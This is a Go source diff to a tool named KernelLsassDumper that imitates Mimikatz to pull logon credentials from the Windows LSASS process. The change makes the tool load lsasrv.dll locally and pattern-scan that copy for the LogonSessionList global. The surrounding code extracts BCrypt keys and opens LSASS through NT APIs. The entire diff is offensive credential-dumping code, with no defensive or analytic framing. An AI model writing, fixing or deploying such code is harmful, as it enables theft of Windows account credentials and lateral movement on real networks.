@@ -480,83 +480,26 @@ func (kld *KernelLsassDumper) openProcessViaNtApi(pid uint32) (windows.Handle, e
 	return handle, nil
 }
 
-// findLsasrvInKernelMemory - Find lsasrv.dll base address IN LSASS's MEMORY (not local!)
+// findLsasrvInKernelMemory - Load lsasrv.dll LOCALLY to get patterns, NOT from LSASS memory
+// Mimikatz loads lsasrv.dll locally for pattern matching, then searches those patterns in LSASS
 func (kld *KernelLsassDumper) findLsasrvInKernelMemory() (uint64, error) {
-	kld.logger.Info("Finding lsasrv.dll in LSASS process memory...")
+	kld.logger.Info("Loading lsasrv.dll LOCALLY from System32 for pattern extraction...")
 
-	// Open LSASS process with minimal permissions to enumerate modules
-	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, kld.lsassPID)
+	// Load lsasrv.dll from System32 into OUR process
+	lsasrvPath := "C:\\Windows\\System32\\lsasrv.dll"
+
+	lsasrvLocal, err := syscall.LoadDLL(lsasrvPath)
 	if err != nil {
-		return 0, fmt.Errorf("failed to open LSASS for module enumeration: %v", err)
+		return 0, fmt.Errorf("failed to load %s: %v", lsasrvPath, err)
 	}
-	defer windows.CloseHandle(hProcess)
+	defer func() {
+		// Don't unload - Windows will handle it
+	}()
 
-	// Enumerate modules in LSASS to find lsasrv.dll
-	psapi := syscall.MustLoadDLL("psapi.dll")
-	enumProcessModulesEx := psapi.MustFindProc("EnumProcessModulesEx")
-	getModuleBaseNameW := psapi.MustFindProc("GetModuleBaseNameW")
-	getModuleInformation := psapi.MustFindProc("GetModuleInformation")
+	localBase := lsasrvLocal.Handle
+	kld.logger.Infof("✓ Loaded lsasrv.dll locally at 0x%X", localBase)
 
-	const LIST_MODULES_ALL = 0x03
-	var modules [1024]syscall.Handle
-	var needed uint32
-
-	ret, _, _ := enumProcessModulesEx.Call(
-		uintptr(hProcess),
-		uintptr(unsafe.Pointer(&modules[0])),
-		uintptr(len(modules)*int(unsafe.Sizeof(modules[0]))),
-		uintptr(unsafe.Pointer(&needed)),
-		LIST_MODULES_ALL,
-	)
-
-	if ret == 0 {
-		return 0, fmt.Errorf("EnumProcessModulesEx failed")
-	}
-
-	moduleCount := needed / uint32(unsafe.Sizeof(modules[0]))
-	kld.logger.Infof("Found %d modules in LSASS", moduleCount)
-
-	// Find lsasrv.dll
-	for i := uint32(0); i < moduleCount; i++ {
-		var baseName [260]uint16
-		ret, _, _ := getModuleBaseNameW.Call(
-			uintptr(hProcess),
-			uintptr(modules[i]),
-			uintptr(unsafe.Pointer(&baseName[0])),
-			uintptr(len(baseName)),
-		)
-
-		if ret == 0 {
-			continue
-		}
-
-		name := syscall.UTF16ToString(baseName[:])
-		if name == "lsasrv.dll" {
-			// Get module information
-			type MODULEINFO struct {
-				BaseOfDll   uintptr
-				SizeOfImage uint32
-				EntryPoint  uintptr
-			}
-
-			var modInfo MODULEINFO
-			ret, _, _ := getModuleInformation.Call(
-				uintptr(hProcess),
-				uintptr(modules[i]),
-				uintptr(unsafe.Pointer(&modInfo)),
-				unsafe.Sizeof(modInfo),
-			)
-
-			if ret == 0 {
-				return 0, fmt.Errorf("GetModuleInformation failed for lsasrv.dll")
-			}
-
-			kld.logger.Infof("✓ Found lsasrv.dll in LSASS at 0x%X (size: 0x%X bytes)", modInfo.BaseOfDll, modInfo.SizeOfImage)
-			return uint64(modInfo.BaseOfDll), nil
-		}
-	}
-
-	return 0, fmt.Errorf("lsasrv.dll not found in LSASS process")
+	return uint64(localBase), nil
 }
 
 // KIWI_BCRYPT_HANDLE_KEY structure from Mimikatz
@@ -786,40 +729,34 @@ func (kld *KernelLsassDumper) extractBCryptKey(hProcess windows.Handle, readProc
 	return keyData, nil
 }
 
-// findLogonSessionList - Find LogonSessionList global in lsasrv.dll BY READING FROM LSASS MEMORY
-// This is EXACTLY how Mimikatz does it - we read from LSASS's copy, not a local one!
-func (kld *KernelLsassDumper) findLogonSessionList(lsasrvBaseInLsass uint64) (uint64, error) {
-	kld.logger.Info("Reading lsasrv.dll FROM LSASS MEMORY to find LogonSessionList...")
+// findLogonSessionList - Find LogonSessionList global in lsasrv.dll by scanning LOCAL copy
+// lsasrvBaseInLsass is actually the LOCAL base where we loaded lsasrv.dll
+func (kld *KernelLsassDumper) findLogonSessionList(lsasrvLocalBase uint64) (uint64, error) {
+	kld.logger.Info("Scanning LOCAL lsasrv.dll for LogonSessionList pattern...")
 
-	// Open LSASS with read permissions
-	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, kld.lsassPID)
-	if err != nil {
-		return 0, fmt.Errorf("failed to open LSASS for reading lsasrv.dll: %v", err)
-	}
-	defer windows.CloseHandle(hProcess)
+	// lsasrvLocalBase is the address where lsasrv.dll was loaded in OUR process
+	// We can read it directly without OpenProcess
 
-	// Read lsasrv.dll from LSASS memory (not local!)
-	// Typical size is ~1.7MB, read 2MB to be safe
-	lsasrvSize := uint32(0x200000) // 2MB
-	lsasrvData := make([]byte, lsasrvSize)
-
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
-
-	var bytesRead uintptr
-	ret, _, _ := readProcessMemory.Call(
-		uintptr(hProcess),
-		uintptr(lsasrvBaseInLsass),
-		uintptr(unsafe.Pointer(&lsasrvData[0])),
-		uintptr(lsasrvSize),
-		uintptr(unsafe.Pointer(&bytesRead)),
-	)
-
-	if ret == 0 {
-		return 0, fmt.Errorf("failed to read lsasrv.dll from LSASS memory")
+	// Read the PE header to get the image size
+	dosHeader := (*[2]byte)(unsafe.Pointer(uintptr(lsasrvLocalBase)))
+	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
+		return 0, fmt.Errorf("invalid PE header at 0x%X", lsasrvLocalBase)
 	}
 
-	kld.logger.Infof("Scanning %d bytes of lsasrv.dll (FROM LSASS) for LogonSessionList pattern...", bytesRead)
+	// Get NT header offset
+	e_lfanew := *(*uint32)(unsafe.Pointer(uintptr(lsasrvLocalBase) + 0x3C))
+	ntHeader := uintptr(lsasrvLocalBase) + uintptr(e_lfanew)
+
+	// Get size of image from optional header
+	sizeOfImage := *(*uint32)(unsafe.Pointer(ntHeader + 0x50))
+
+	kld.logger.Infof("lsasrv.dll loaded at 0x%X, size: 0x%X bytes", lsasrvLocalBase, sizeOfImage)
+
+	// Create a slice view of the loaded DLL (no copy needed!)
+	lsasrvData := unsafe.Slice((*byte)(unsafe.Pointer(uintptr(lsasrvLocalBase))), sizeOfImage)
+
+	kld.logger.Infof("Scanning %d bytes of lsasrv.dll (LOCAL) for LogonSessionList pattern...", len(lsasrvData))
+	bytesRead := uintptr(len(lsasrvData))
 
 	// Try MULTIPLE patterns for different Windows builds
 	patterns := []struct {
@@ -853,30 +790,16 @@ func (kld *KernelLsassDumper) findLogonSessionList(lsasrvBaseInLsass uint64) (ui
 				ripOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+3 : i+7]))
 
 				// Calculate target address: instructionAddr + instructionLength(7) + ripOffset
-				instructionAddr := lsasrvBaseInLsass + uint64(i)
+				instructionAddr := lsasrvLocalBase + uint64(i)
 				targetAddr := instructionAddr + 7 + uint64(ripOffset)
 
 				kld.logger.Infof("✓ Found LogonSessionList pattern (%s) at offset 0x%X", p.name, i)
 				kld.logger.Infof("  Instruction at: 0x%X", instructionAddr)
 				kld.logger.Infof("  RIP offset: 0x%X (%d)", ripOffset, ripOffset)
-				kld.logger.Infof("  Target address: 0x%X", targetAddr)
+				kld.logger.Infof("  Target address (LOCAL): 0x%X", targetAddr)
 
-				// NOW READ THE POINTER VALUE FROM THAT TARGET ADDRESS IN LSASS MEMORY
-				var pointerValue uint64
-				var ptrBytesRead uintptr
-
-				ret, _, _ := readProcessMemory.Call(
-					uintptr(hProcess),
-					uintptr(targetAddr),
-					uintptr(unsafe.Pointer(&pointerValue)),
-					8, // Read 8 bytes (pointer size)
-					uintptr(unsafe.Pointer(&ptrBytesRead)),
-				)
-
-				if ret == 0 || ptrBytesRead != 8 {
-					kld.logger.Warnf("  Failed to read pointer at 0x%X, trying next match", targetAddr)
-					continue
-				}
+				// Read the pointer value from our LOCAL copy (it's already in our address space!)
+				pointerValue := *(*uint64)(unsafe.Pointer(uintptr(targetAddr)))
 
 				kld.logger.Infof("  ✓ LogonSessionList pointer: 0x%X", pointerValue)
 
